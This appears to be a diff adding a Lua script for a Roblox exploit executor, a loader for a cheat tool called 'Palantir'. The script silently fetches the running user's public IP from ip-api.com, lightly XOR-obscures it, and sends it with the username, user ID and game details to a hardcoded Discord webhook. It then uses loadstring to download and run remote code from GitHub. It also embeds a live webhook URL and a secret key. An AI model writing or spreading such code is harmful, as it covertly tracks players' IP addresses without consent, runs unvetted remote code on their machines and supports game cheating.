@@ -1,0 +1,112 @@
+--// =========================
+--// CONFIG
+--// =========================
+
+local WHITELIST = {
+    
+}
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1454102218490908878/k_GqkU_Jh4I4x8PNUmKZCej8YJkl2O_Rue_HFav9Ki2yntg9ihvAjprXXkCHLq7wa55i"
+
+-- 🔑 KEEP THIS SECRET
+local SECRET_KEY = "c21b962e71f1969d6aea8af9083cc2ec3267ac9c32939d88368ab876f514624d"
+
+--// =========================
+--// SERVICES
+--// =========================
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+local requestFunc =
+    (syn and syn.request) or
+    http_request or
+    request or
+    (fluxus and fluxus.request)
+
+--// =========================
+--// UTILS
+--// =========================
+
+local function inTable(t, v)
+    return table.find(t, tonumber(v)) ~= nil
+end
+
+-- XOR encrypt → hex
+local function xorEncrypt(str, key)
+    local out = {}
+    for i = 1, #str do
+        local c = string.byte(str, i)
+        local k = string.byte(key, ((i - 1) % #key) + 1)
+        table.insert(out, string.format("%02x", bit32.bxor(c, k)))
+    end
+    return table.concat(out)
+end
+
+--// =========================
+--// LOGGER
+--// =========================
+
+local function log(action)
+    if not requestFunc then return end
+
+    local gameName = "Unknown"
+    pcall(function()
+        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+
+    local encryptedIP = "Unavailable"
+
+    pcall(function()
+        local res = requestFunc({
+            Url = "http://ip-api.com/json",
+            Method = "GET",
+            Headers = { ["User-Agent"] = "Mozilla/5.0" }
+        })
+        if res and res.Body then
+            local ip = HttpService:JSONDecode(res.Body).query
+            if ip then
+                encryptedIP = xorEncrypt(ip, SECRET_KEY)
+            end
+        end
+    end)
+
+    local payload = {
+        username = "Palantir Logger",
+        embeds = {{
+            title = "📜 Palantir Log",
+            color = 5793266,
+            fields = {
+                { name = "User", value = LocalPlayer.Name, inline = true },
+                { name = "UserId", value = tostring(LocalPlayer.UserId), inline = true },
+                { name = "Encrypted IP", value = encryptedIP, inline = false },
+                { name = "Game", value = gameName, inline = false },
+                { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+                { name = "Action", value = action, inline = false },
+                { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true }
+            }
+        }}
+    }
+
+    requestFunc({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+--// =========================
+--// WHITELIST
+--// =========================
+
+if not inTable(WHITELIST, LocalPlayer.UserId) then
+    log("❌ Execution attempt (NOT WHITELISTED)")
+    LocalPlayer:Kick("Not whitelisted.")
+    return
+else
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BelioScripts/Palantir/refs/heads/main/Palantir.lua'))()
+log("✅ Script executed (WHITELISTED)")
+end
